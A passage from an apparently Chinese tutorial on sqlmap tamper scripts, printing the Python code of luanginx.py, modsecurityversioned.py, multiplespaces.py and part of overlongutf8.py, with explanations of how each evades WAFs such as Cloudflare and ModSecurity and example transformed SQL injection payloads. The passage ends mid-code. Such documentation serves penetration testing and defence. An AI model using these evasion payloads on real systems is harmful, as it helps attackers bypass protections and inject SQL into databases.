<h3 id="1-作用：将payload大写转换成小写的"><a href="#1-作用：将payload大写转换成小写的" class="headerlink" title="1.作用：将payload大写转换成小写的"></a>1.作用：将payload大写转换成小写的</h3><h2 id="26-luanginx-py"><a href="#26-luanginx-py" class="headerlink" title="26.luanginx.py"></a>26.luanginx.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">hints = kwargs.get(<span class="hljs-string">&quot;hints&quot;</span>, &#123;&#125;)<br>delimiter = kwargs.get(<span class="hljs-string">&quot;delimiter&quot;</span>, DEFAULT_GET_POST_DELIMITER)<br><br>hints[HINT.PREPEND] = delimiter.join(<span class="hljs-string">&quot;%s=&quot;</span> % <span class="hljs-string">&quot;&quot;</span>.join(random.sample(string.letters + string.digits, <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">500</span>))<br><br><span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure>
<p>1.作用：用于绕过<code>LUA-NGINX WAFS</code>比如<code>Cloudflare</code>，原理是：Lua Nginx WAFs不支持超过100个参数的处理。</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-number">1</span> AND <span class="hljs-number">2</span>&gt;<span class="hljs-number">1</span><br>-----&gt;<br><span class="hljs-number">0U</span>=<span class="hljs-variable">&amp;</span>Aq=<span class="hljs-variable">&amp;</span>Fz=<span class="hljs-variable">&amp;</span>Ws=<span class="hljs-variable">&amp;</span>DK=<span class="hljs-variable">&amp;</span><span class="hljs-number">4F</span>=<span class="hljs-variable">&amp;</span>rU=<span class="hljs-variable">&amp;</span>Mp=<span class="hljs-variable">&amp;48</span>=<span class="hljs-variable">&amp;</span>Y3=<span class="hljs-variable">&amp;</span>tT=<span class="hljs-variable">&amp;</span><span class="hljs-number">3</span>Q=<span class="hljs-variable">&amp;</span>Dg=<span class="hljs-variable">&amp;</span>AL=<span class="hljs-variable">&amp;47</span>=<span class="hljs-variable">&amp;</span>D1=<span class="hljs-variable">&amp;</span>qX=<span class="hljs-variable">&amp;</span>Ia=<span class="hljs-variable">&amp;</span>Sy=<span class="hljs-variable">&amp;</span>ZP=<span class="hljs-variable">&amp;</span>aE=<span class="hljs-variable">&amp;1p</span>=<span class="hljs-variable">&amp;u1</span>=<span class="hljs-variable">&amp;</span>lJ=<span class="hljs-variable">&amp;o7</span>=<span class="hljs-variable">&amp;</span>XB=<span class="hljs-variable">&amp;et</span>=<span class="hljs-variable">&amp;</span>F5=<span class="hljs-variable">&amp;</span>gI=<span class="hljs-variable">&amp;</span>RH=<span class="hljs-variable">&amp;</span>YH=<span class="hljs-variable">&amp;</span><span class="hljs-number">7L</span>=<span class="hljs-variable">&amp;</span>KB=<span class="hljs-variable">&amp;</span>Kx=<span class="hljs-variable">&amp;</span>Js=<span class="hljs-variable">&amp;</span>lL=<span class="hljs-variable">&amp;</span>OD=<span class="hljs-variable">&amp;</span>fU=<span class="hljs-variable">&amp;25</span>=<span class="hljs-variable">&amp;03</span>=<span class="hljs-variable">&amp;</span><span class="hljs-number">5</span>H=<span class="hljs-variable">&amp;</span>yR=<span class="hljs-variable">&amp;</span>rY=<span class="hljs-variable">&amp;03</span>=<span class="hljs-variable">&amp;</span>K6=<span class="hljs-variable">&amp;</span>JB=<span class="hljs-variable">&amp;</span>O9=<span class="hljs-variable">&amp;</span><span class="hljs-number">4</span>X=<span class="hljs-variable">&amp;</span>fL=<span class="hljs-variable">&amp;</span>EN=<span class="hljs-variable">&amp;0p</span>=<span class="hljs-variable">&amp;</span>Th=<span class="hljs-variable">&amp;</span>nX=<span class="hljs-variable">&amp;</span>uY=<span class="hljs-variable">&amp;gj</span>=<span class="hljs-variable">&amp;</span>Rc=<span class="hljs-variable">&amp;</span>J4=<span class="hljs-variable">&amp;</span>HQ=<span class="hljs-variable">&amp;</span>bN=<span class="hljs-variable">&amp;</span>LJ=<span class="hljs-variable">&amp;yw</span>=<span class="hljs-variable">&amp;8c</span>=<span class="hljs-variable">&amp;b7</span>=<span class="hljs-variable">&amp;lh</span>=<span class="hljs-variable">&amp;</span>nX=<span class="hljs-variable">&amp;6b</span>=<span class="hljs-variable">&amp;</span>Ag=<span class="hljs-variable">&amp;qn</span>=<span class="hljs-variable">&amp;</span>Ov=<span class="hljs-variable">&amp;</span>lF=<span class="hljs-variable">&amp;cg</span>=<span class="hljs-variable">&amp;9m</span>=<span class="hljs-variable">&amp;</span>wT=<span class="hljs-variable">&amp;</span>Z4=<span class="hljs-variable">&amp;</span>kP=<span class="hljs-variable">&amp;7d</span>=<span class="hljs-variable">&amp;</span>P0=<span class="hljs-variable">&amp;vp</span>=<span class="hljs-variable">&amp;</span>LB=<span class="hljs-variable">&amp;</span>kD=<span class="hljs-variable">&amp;</span>zJ=<span class="hljs-variable">&amp;</span>Ft=<span class="hljs-variable">&amp;</span>wZ=<span class="hljs-variable">&amp;</span>pI=<span class="hljs-variable">&amp;</span>aT=<span class="hljs-variable">&amp;uc</span>=<span class="hljs-variable">&amp;ro</span>=<span class="hljs-variable">&amp;7v</span>=<span class="hljs-variable">&amp;rw</span>=<span class="hljs-variable">&amp;</span><span class="hljs-number">6</span>N=<span class="hljs-variable">&amp;</span>MS=<span class="hljs-variable">&amp;yz</span>=<span class="hljs-variable">&amp;</span>Oa=<span class="hljs-variable">&amp;lu</span>=<span class="hljs-variable">&amp;</span>oN=<span class="hljs-variable">&amp;x2</span>=<span class="hljs-variable">&amp;</span>Jz=<span class="hljs-variable">&amp;</span>yR=<span class="hljs-variable">&amp;</span>zP=<span class="hljs-variable">&amp;</span>cB=<span class="hljs-variable">&amp;qj</span>=<span class="hljs-variable">&amp;</span>GE=<span class="hljs-variable">&amp;</span>IU=<span class="hljs-variable">&amp;</span><span class="hljs-number">2</span>E=<span class="hljs-variable">&amp;</span>tC=<span class="hljs-variable">&amp;</span>Y2=<span class="hljs-variable">&amp;</span>Yl=<span class="hljs-variable">&amp;</span><span class="hljs-number">9</span>N=<span class="hljs-variable">&amp;</span>fS=<span class="hljs-variable">&amp;9y</span>=<span class="hljs-variable">&amp;</span>Qt=<span class="hljs-variable">&amp;</span>nS=<span class="hljs-variable">&amp;</span>aZ=<span class="hljs-variable">&amp;</span>Gg=<span class="hljs-variable">&amp;</span>hO=<span class="hljs-variable">&amp;2r</span>=<span class="hljs-variable">&amp;8g</span>=<span class="hljs-variable">&amp;0y</span>=<span class="hljs-variable">&amp;fr</span>=<span class="hljs-variable">&amp;</span>CX=<span class="hljs-variable">&amp;1i</span>=<span class="hljs-variable">&amp;</span>GO=<span class="hljs-variable">&amp;v2</span>=<span class="hljs-variable">&amp;rb</span>=<span class="hljs-variable">&amp;</span>cQ=<span class="hljs-variable">&amp;</span>I6=<span class="hljs-variable">&amp;64</span>=<span class="hljs-variable">&amp;</span>cU=<span class="hljs-variable">&amp;</span>RO=<span class="hljs-variable">&amp;</span>S3=<span class="hljs-variable">&amp;</span>Nx=<span class="hljs-variable">&amp;</span>Hm=<span class="hljs-variable">&amp;</span>Ka=<span class="hljs-variable">&amp;ju</span>=<span class="hljs-variable">&amp;</span>WS=<span class="hljs-variable">&amp;</span>uM=<span class="hljs-variable">&amp;ck</span>=<span class="hljs-variable">&amp;8r</span>=<span class="hljs-variable">&amp;</span>yI=<span class="hljs-variable">&amp;</span>sD=<span class="hljs-variable">&amp;oc</span>=<span class="hljs-variable">&amp;</span>lG=<span class="hljs-variable">&amp;ey</span>=<span class="hljs-variable">&amp;uz</span>=<span class="hljs-variable">&amp;g4</span>=<span class="hljs-variable">&amp;</span>D0=<span class="hljs-variable">&amp;8v</span>=<span class="hljs-variable">&amp;</span>DR=<span class="hljs-variable">&amp;</span>As=<span class="hljs-variable">&amp;</span>T3=<span class="hljs-variable">&amp;</span><span class="hljs-number">5</span>M=<span class="hljs-variable">&amp;x8</span>=<span class="hljs-variable">&amp;</span>Ne=<span class="hljs-variable">&amp;</span>fU=<span class="hljs-variable">&amp;da</span>=<span class="hljs-variable">&amp;</span>yG=<span class="hljs-variable">&amp;</span>BE=<span class="hljs-variable">&amp;</span>KQ=<span class="hljs-variable">&amp;</span>Aw=<span class="hljs-variable">&amp;9q</span>=<span class="hljs-variable">&amp;</span>WA=<span class="hljs-variable">&amp;wd</span>=<span class="hljs-variable">&amp;</span><span class="hljs-number">1</span>R=<span class="hljs-variable">&amp;</span><span class="hljs-number">3</span>B=<span class="hljs-variable">&amp;</span>Ph=<span class="hljs-variable">&amp;ym</span>=<span class="hljs-variable">&amp;c6</span>=<span class="hljs-variable">&amp;nj</span>=<span class="hljs-variable">&amp;mx</span>=<span class="hljs-variable">&amp;</span>Hj=<span class="hljs-variable">&amp;98</span>=<span class="hljs-variable">&amp;jz</span>=<span class="hljs-variable">&amp;</span>Q2=<span class="hljs-variable">&amp;</span>E4=<span class="hljs-variable">&amp;</span>tE=<span class="hljs-variable">&amp;</span>EP=<span class="hljs-variable">&amp;</span>mL=<span class="hljs-variable">&amp;nv</span>=<span class="hljs-variable">&amp;73</span>=<span class="hljs-variable">&amp;</span>Yc=<span class="hljs-variable">&amp;jp</span>=<span class="hljs-variable">&amp;</span>W0=<span class="hljs-variable">&amp;</span>KS=<span class="hljs-variable">&amp;</span>Ye=<span class="hljs-variable">&amp;f1</span>=<span class="hljs-variable">&amp;cn</span>=<span class="hljs-variable">&amp;ca</span>=<span class="hljs-variable">&amp;0u</span>=<span class="hljs-variable">&amp;</span>jO=<span class="hljs-variable">&amp;</span><span class="hljs-number">8F</span>=<span class="hljs-variable">&amp;</span><span class="hljs-number">3F</span>=<span class="hljs-variable">&amp;</span>JQ=<span class="hljs-variable">&amp;</span>XU=<span class="hljs-variable">&amp;</span><span class="hljs-number">9U</span>=<span class="hljs-variable">&amp;4m</span>=<span class="hljs-variable">&amp;</span>HL=<span class="hljs-variable">&amp;</span>ZD=<span class="hljs-variable">&amp;</span>Xy=<span class="hljs-variable">&amp;</span>K0=<span class="hljs-variable">&amp;</span>XO=<span class="hljs-variable">&amp;al</span>=<span class="hljs-variable">&amp;</span>Fp=<span class="hljs-variable">&amp;e1</span>=<span class="hljs-variable">&amp;6s</span>=<span class="hljs-variable">&amp;</span>zY=<span class="hljs-variable">&amp;</span>dN=<span class="hljs-variable">&amp;hr</span>=<span class="hljs-variable">&amp;</span>Zd=<span class="hljs-variable">&amp;cz</span>=<span class="hljs-variable">&amp;</span>E1=<span class="hljs-variable">&amp;</span>SP=<span class="hljs-variable">&amp;j9</span>=<span class="hljs-variable">&amp;</span>zL=<span class="hljs-variable">&amp;xc</span>=<span class="hljs-variable">&amp;</span>Dj=<span class="hljs-variable">&amp;</span>cM=<span class="hljs-variable">&amp;</span>Ng=<span class="hljs-variable">&amp;</span>Iv=<span class="hljs-variable">&amp;</span>xW=<span class="hljs-variable">&amp;</span>E2=<span class="hljs-variable">&amp;</span>LC=<span class="hljs-variable">&amp;</span>Nu=<span class="hljs-variable">&amp;</span>hQ=<span class="hljs-variable">&amp;</span>MW=<span class="hljs-variable">&amp;h4</span>=<span class="hljs-variable">&amp;</span>X4=<span class="hljs-variable">&amp;</span><span class="hljs-number">2</span>Q=<span class="hljs-variable">&amp;</span>YG=<span class="hljs-variable">&amp;</span>Wl=<span class="hljs-variable">&amp;</span>WB=<span class="hljs-variable">&amp;</span>UC=<span class="hljs-variable">&amp;</span>We=<span class="hljs-variable">&amp;c5</span>=<span class="hljs-variable">&amp;</span>E3=<span class="hljs-variable">&amp;</span><span class="hljs-number">6</span>P=<span class="hljs-variable">&amp;</span>Jn=<span class="hljs-variable">&amp;</span>fY=<span class="hljs-variable">&amp;</span><span class="hljs-number">3</span>W=<span class="hljs-variable">&amp;</span>RA=<span class="hljs-variable">&amp;sh</span>=<span class="hljs-variable">&amp;</span>AJ=<span class="hljs-variable">&amp;56</span>=<span class="hljs-variable">&amp;zg</span>=<span class="hljs-variable">&amp;</span>VT=<span class="hljs-variable">&amp;</span>bB=<span class="hljs-variable">&amp;</span>Qb=<span class="hljs-variable">&amp;47</span>=<span class="hljs-variable">&amp;</span>Se=<span class="hljs-variable">&amp;ew</span>=<span class="hljs-variable">&amp;bv</span>=<span class="hljs-variable">&amp;a8</span>=<span class="hljs-variable">&amp;</span>Ye=<span class="hljs-variable">&amp;3m</span>=<span class="hljs-variable">&amp;</span>mP=<span class="hljs-variable">&amp;6h</span>=<span class="hljs-variable">&amp;aw</span>=<span class="hljs-variable">&amp;</span>bL=<span class="hljs-variable">&amp;1l</span>=<span class="hljs-variable">&amp;gv</span>=<span class="hljs-variable">&amp;7i</span>=<span class="hljs-variable">&amp;7w</span>=<span class="hljs-variable">&amp;</span>Ds=<span class="hljs-variable">&amp;67</span>=<span class="hljs-variable">&amp;</span>Nl=<span class="hljs-variable">&amp;9g</span>=<span class="hljs-variable">&amp;</span>Kj=<span class="hljs-variable">&amp;36</span>=<span class="hljs-variable">&amp;</span>Xt=<span class="hljs-variable">&amp;</span>pU=<span class="hljs-variable">&amp;</span>sA=<span class="hljs-variable">&amp;ci</span>=<span class="hljs-variable">&amp;be</span>=<span class="hljs-variable">&amp;</span>eA=<span class="hljs-variable">&amp;</span>IT=<span class="hljs-variable">&amp;</span>iA=<span class="hljs-variable">&amp;</span>Nf=<span class="hljs-variable">&amp;</span>Bw=<span class="hljs-variable">&amp;6d</span>=<span class="hljs-variable">&amp;</span>zT=<span class="hljs-variable">&amp;tm</span>=<span class="hljs-variable">&amp;</span>sD=<span class="hljs-variable">&amp;</span><span class="hljs-number">6</span>X=<span class="hljs-variable">&amp;</span>rI=<span class="hljs-variable">&amp;</span>QX=<span class="hljs-variable">&amp;</span>By=<span class="hljs-variable">&amp;</span>VA=<span class="hljs-variable">&amp;</span>pC=<span class="hljs-variable">&amp;6i</span>=<span class="hljs-variable">&amp;</span>CN=<span class="hljs-variable">&amp;</span>Dm=<span class="hljs-variable">&amp;</span>aR=<span class="hljs-variable">&amp;</span>Ma=<span class="hljs-variable">&amp;</span>sV=<span class="hljs-variable">&amp;</span>MH=<span class="hljs-variable">&amp;</span>jR=<span class="hljs-variable">&amp;</span>DQ=<span class="hljs-variable">&amp;</span>Vo=<span class="hljs-variable">&amp;</span>Vr=<span class="hljs-variable">&amp;9h</span>=<span class="hljs-variable">&amp;2c</span>=<span class="hljs-variable">&amp;</span>pG=<span class="hljs-variable">&amp;</span>Ky=<span class="hljs-variable">&amp;gp</span>=<span class="hljs-variable">&amp;</span>rU=<span class="hljs-variable">&amp;</span><span class="hljs-number">4</span>K=<span class="hljs-variable">&amp;</span>cX=<span class="hljs-variable">&amp;sv</span>=<span class="hljs-variable">&amp;</span>Gp=<span class="hljs-variable">&amp;5k</span>=<span class="hljs-variable">&amp;zr</span>=<span class="hljs-variable">&amp;</span>GJ=<span class="hljs-variable">&amp;</span>MG=<span class="hljs-variable">&amp;</span>zN=<span class="hljs-variable">&amp;</span>zW=<span class="hljs-variable">&amp;</span>Ws=<span class="hljs-variable">&amp;</span>xM=<span class="hljs-variable">&amp;</span>jR=<span class="hljs-variable">&amp;</span>xK=<span class="hljs-variable">&amp;</span>iP=<span class="hljs-variable">&amp;</span>vD=<span class="hljs-variable">&amp;</span>zD=<span class="hljs-variable">&amp;</span>Rt=<span class="hljs-variable">&amp;</span>Od=<span class="hljs-variable">&amp;</span>sU=<span class="hljs-variable">&amp;</span>dM=<span class="hljs-variable">&amp;</span>bD=<span class="hljs-variable">&amp;3a</span>=<span class="hljs-variable">&amp;</span>Ge=<span class="hljs-variable">&amp;</span><span class="hljs-number">1</span>Q=<span class="hljs-variable">&amp;</span>UP=<span class="hljs-variable">&amp;ac</span>=<span class="hljs-variable">&amp;</span>M9=<span class="hljs-variable">&amp;</span><span class="hljs-number">2</span>R=<span class="hljs-variable">&amp;</span>To=<span class="hljs-variable">&amp;</span>Ur=<span class="hljs-variable">&amp;</span>gC=<span class="hljs-variable">&amp;uk</span>=<span class="hljs-variable">&amp;</span>A3=<span class="hljs-variable">&amp;</span>AB=<span class="hljs-variable">&amp;</span>RG=<span class="hljs-variable">&amp;i4</span>=<span class="hljs-variable">&amp;</span>BW=<span class="hljs-variable">&amp;</span>yY=<span class="hljs-variable">&amp;yn</span>=<span class="hljs-variable">&amp;m6</span>=<span class="hljs-variable">&amp;</span>Kd=<span class="hljs-variable">&amp;yo</span>=<span class="hljs-variable">&amp;fl</span>=<span class="hljs-variable">&amp;</span>dN=<span class="hljs-variable">&amp;</span>kL=<span class="hljs-variable">&amp;</span>LR=<span class="hljs-variable">&amp;</span>Fr=<span class="hljs-variable">&amp;2v</span>=<span class="hljs-variable">&amp;</span>CN=<span class="hljs-variable">&amp;</span>F7=<span class="hljs-variable">&amp;75</span>=<span class="hljs-variable">&amp;</span><span class="hljs-number">5</span>K=<span class="hljs-variable">&amp;</span>ER=<span class="hljs-variable">&amp;nq</span>=<span class="hljs-variable">&amp;ck</span>=<span class="hljs-variable">&amp;</span>aO=<span class="hljs-variable">&amp;</span>iW=<span class="hljs-variable">&amp;</span>Q8=<span class="hljs-variable">&amp;y5</span>=<span class="hljs-variable">&amp;</span>Cv=<span class="hljs-variable">&amp;g2</span>=<span class="hljs-variable">&amp;</span>Xu=<span class="hljs-variable">&amp;</span>Cu=<span class="hljs-variable">&amp;bc</span>=<span class="hljs-variable">&amp;wm</span>=<span class="hljs-variable">&amp;</span>Gl=<span class="hljs-variable">&amp;</span>mP=<span class="hljs-variable">&amp;</span>Tt=<span class="hljs-variable">&amp;1p</span>=<span class="hljs-variable">&amp;</span>vS=<span class="hljs-variable">&amp;c5</span>=<span class="hljs-variable">&amp;</span>eC=<span class="hljs-variable">&amp;</span>Sc=<span class="hljs-variable">&amp;</span>Y8=<span class="hljs-variable">&amp;</span>Ch=<span class="hljs-variable">&amp;fg</span>=<span class="hljs-variable">&amp;</span>Vz=<span class="hljs-variable">&amp;</span><span class="hljs-number">4</span>B=<span class="hljs-variable">&amp;</span>eA=<span class="hljs-variable">&amp;</span>UZ=<span class="hljs-variable">&amp;cl</span>=<span class="hljs-variable">&amp;</span>Eh=<span class="hljs-variable">&amp;25</span>=<span class="hljs-variable">&amp;</span>tA=<span class="hljs-variable">&amp;</span>Ir=<span class="hljs-variable">&amp;</span>Hm=<span class="hljs-variable">&amp;</span>sB=<span class="hljs-variable">&amp;</span>LH=<span class="hljs-variable">&amp;qo</span>=<span class="hljs-variable">&amp;</span>hW=<span class="hljs-variable">&amp;</span>gT=<span class="hljs-variable">&amp;pr</span>=<span class="hljs-variable">&amp;</span>TO=<span class="hljs-variable">&amp;</span>TF=<span class="hljs-variable">&amp;1h</span>=<span class="hljs-variable">&amp;</span>Oh=<span class="hljs-variable">&amp;</span>Tw=<span class="hljs-variable">&amp;</span>PR=<span class="hljs-variable">&amp;</span>On=<span class="hljs-variable">&amp;</span>Zo=<span class="hljs-variable">&amp;</span>GP=<span class="hljs-variable">&amp;</span>oM=<span class="hljs-variable">&amp;rk</span>=<span class="hljs-variable">&amp;</span>YI=<span class="hljs-variable">&amp;</span>uK=<span class="hljs-variable">&amp;bi</span>=<span class="hljs-variable">&amp;y8</span>=<span class="hljs-variable">&amp;</span>Fe=<span class="hljs-variable">&amp;</span>VW=<span class="hljs-variable">&amp;</span>WJ=<span class="hljs-variable">&amp;</span>Rn=<span class="hljs-variable">&amp;</span>TY=<span class="hljs-variable">&amp;</span>Vv=<span class="hljs-variable">&amp;</span>KM=<span class="hljs-variable">&amp;3g</span>=<span class="hljs-variable">&amp;</span>ZG=<span class="hljs-variable">&amp;</span>wC=<span class="hljs-variable">&amp;an</span>=<span class="hljs-variable">&amp;</span>OE=<span class="hljs-variable">&amp;</span><span class="hljs-number">7</span>D=<span class="hljs-variable">&amp;t0</span>=<span class="hljs-variable">&amp;</span>qL=<span class="hljs-variable">&amp;</span>RY=<span class="hljs-variable">&amp;</span>Wx=<span class="hljs-variable">&amp;dc</span>=<span class="hljs-variable">&amp;</span>T7=<span class="hljs-variable">&amp;</span>vB=<span class="hljs-variable">&amp;</span>SO=<span class="hljs-variable">&amp;</span>qP=<span class="hljs-variable">&amp;sw</span>=<span class="hljs-variable">&amp;</span>HT=<span class="hljs-variable">&amp;jb</span>=<span class="hljs-variable">&amp;</span>Mb=<span class="hljs-variable">&amp;cn</span>=<span class="hljs-variable">&amp;</span>Oe=<span class="hljs-variable">&amp;d8</span>=<span class="hljs-variable">&amp;</span>A3=<span class="hljs-variable">&amp;</span>nA=<span class="hljs-variable">&amp;wk</span>=<span class="hljs-variable">&amp;u9</span>=<span class="hljs-variable">&amp;</span>Ux=<span class="hljs-variable">&amp;zq</span>=<span class="hljs-variable">&amp;</span>GT=<span class="hljs-variable">&amp;</span>QC=<span class="hljs-variable">&amp;c5</span>=<span class="hljs-variable">&amp;zy</span>=<span class="hljs-variable">&amp;ai</span>=<span class="hljs-variable">&amp;</span><span class="hljs-number">1F</span>=<span class="hljs-variable">&amp;</span>Tj=<span class="hljs-variable">&amp;u0</span>=<span class="hljs-variable">&amp;</span>Yp=<span class="hljs-variable">&amp;</span>bY=<span class="hljs-variable">&amp;</span>kW=<span class="hljs-variable">&amp;</span>Qk=<span class="hljs-variable">&amp;e5</span>=<span class="hljs-variable">&amp;</span>LM=<span class="hljs-variable">&amp;</span>Cj=<span class="hljs-variable">&amp;</span>Lp=<span class="hljs-variable">&amp;</span>XT=<span class="hljs-variable">&amp;b5</span>=<span class="hljs-variable">&amp;cf</span>=<span class="hljs-variable">&amp;sj</span>=<span class="hljs-variable">&amp;ow</span>=<span class="hljs-variable">&amp;</span>Tz=<span class="hljs-variable">&amp;</span>qE=<span class="hljs-variable">&amp;yt</span>=<span class="hljs-variable">&amp;</span><span class="hljs-number">3</span>I=<span class="hljs-variable">&amp;</span><span class="hljs-number">8</span>V=<span class="hljs-variable">&amp;</span>Jq=<span class="hljs-variable">&amp;</span>QC=<span class="hljs-variable">&amp;</span>Sz=<span class="hljs-variable">&amp;</span>Eb=<span class="hljs-variable">&amp;</span>Tc=<span class="hljs-variable">&amp;</span>QK=<span class="hljs-variable">&amp;</span>Wr=<span class="hljs-variable">&amp;</span>Qm=<span class="hljs-variable">&amp;</span>Gv=<span class="hljs-variable">&amp;8m</span>=<span class="hljs-variable">&amp;</span>Ju=<span class="hljs-variable">&amp;85</span>=<span class="hljs-variable">&amp;</span>KS=<span class="hljs-variable">&amp;</span>Qv=<span class="hljs-variable">&amp;43</span>=<span class="hljs-variable">&amp;</span>uU=<span class="hljs-variable">&amp;</span>aY=<span class="hljs-variable">&amp;</span>J7=<span class="hljs-variable">&amp;</span>wM=<span class="hljs-variable">&amp;</span>uW=<span class="hljs-variable">&amp;</span>L9=<span class="hljs-variable">&amp;ai</span>=<span class="hljs-variable">&amp;ch</span>=<span class="hljs-variable">&amp;56</span>=<span class="hljs-variable">&amp;</span>D6=<span class="hljs-variable">&amp;</span>YW=<span class="hljs-variable">&amp;</span>Ul=<span class="hljs-variable">&amp;1</span> AND <span class="hljs-number">2</span>&gt;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>


<h2 id="27-modsecurityversioned-py"><a href="#27-modsecurityversioned-py" class="headerlink" title="27.modsecurityversioned.py"></a>27.modsecurityversioned.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    postfix = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> comment <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;--&#x27;</span>, <span class="hljs-string">&#x27;/*&#x27;</span>):<br>        <span class="hljs-keyword">if</span> comment <span class="hljs-keyword">in</span> payload:<br>            postfix = payload[payload.find(comment):]<br>            payload = payload[:payload.find(comment)]<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-keyword">in</span> payload:<br>        retVal = <span class="hljs-string">&quot;%s /*!30%s%s*/%s&quot;</span> % (payload[:payload.find(<span class="hljs-string">&#x27; &#x27;</span>)], randomInt(<span class="hljs-number">3</span>), payload[payload.find(<span class="hljs-string">&#x27; &#x27;</span>) + <span class="hljs-number">1</span>:], postfix)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：利用内敛注释来包围完整的查询语句，用于绕过-ModSecurity-开源-waf"><a href="#1-作用：利用内敛注释来包围完整的查询语句，用于绕过-ModSecurity-开源-waf" class="headerlink" title="1.作用：利用内敛注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf"></a>1.作用：利用内敛注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">AND</span> <span class="hljs-number">2</span>&gt;<span class="hljs-number">1</span>--      ---&gt;      <span class="hljs-number">1</span> /*!<span class="hljs-number">30874</span><span class="hljs-keyword">AND</span> <span class="hljs-number">2</span>&gt;<span class="hljs-number">1</span>*/--<br></code></pre></td></tr></table></figure>
<h3 id="2-要求：-9"><a href="#2-要求：-9" class="headerlink" title="2.要求："></a>2.要求：</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Requirement:</span><br>    * MySQL<br></code></pre></td></tr></table></figure>


<h2 id="28-multiplespaces-py"><a href="#28-multiplespaces-py" class="headerlink" title="28.multiplespaces.py"></a>28.multiplespaces.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    words = <span class="hljs-built_in">set</span>()<br><br>    <span class="hljs-keyword">for</span> match <span class="hljs-keyword">in</span> re.finditer(<span class="hljs-string">r&quot;\b[A-Za-z_]+\b&quot;</span>, payload):<br>        word = match.group()<br><br>        <span class="hljs-keyword">if</span> word.upper() <span class="hljs-keyword">in</span> kb.keywords:<br>            words.add(word)<br><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:<br>        retVal = re.sub(<span class="hljs-string">r&quot;(?&lt;=\W)%s(?=[^A-Za-z_(]|\Z)&quot;</span> % word, <span class="hljs-string">&quot;%s%s%s&quot;</span> % (<span class="hljs-string">&#x27; &#x27;</span> * random.randrange(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>), word, <span class="hljs-string">&#x27; &#x27;</span> * random.randrange(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>)), retVal)<br>        retVal = re.sub(<span class="hljs-string">r&quot;(?&lt;=\W)%s(?=[(])&quot;</span> % word, <span class="hljs-string">&quot;%s%s&quot;</span> % (<span class="hljs-string">&#x27; &#x27;</span> * random.randrange(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>), word), retVal)<br><br><span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>
<h3 id="1-作用：在关键字周围添加多个空格，用于绕过一些比较薄弱的firewall和waf…"><a href="#1-作用：在关键字周围添加多个空格，用于绕过一些比较薄弱的firewall和waf…" class="headerlink" title="1.作用：在关键字周围添加多个空格，用于绕过一些比较薄弱的firewall和waf…"></a>1.作用：在关键字周围添加多个空格，用于绕过一些比较薄弱的firewall和waf…</h3><h2 id="29-overlongutf8-py"><a href="#29-overlongutf8-py" class="headerlink" title="29.overlongutf8.py"></a>29.overlongutf8.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">retVal = payload<br><br><span class="hljs-keyword">if</span> payload:<br>    retVal = <span class="hljs-string">&quot;&quot;</span><br>    i = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(payload):<br>        <span class="hljs-keyword">if</span> payload[i] == <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">and</span> (i &lt; <span class="hljs-built_in">len</span>(payload) - <span class="hljs-number">2</span>) <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">1</span>:i + <span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> string.hexdigits <span class="hljs-keyword">and</span> payload[i + <span class="hljs-number">2</span>:i + <span class="hljs-number">3</span>] <span 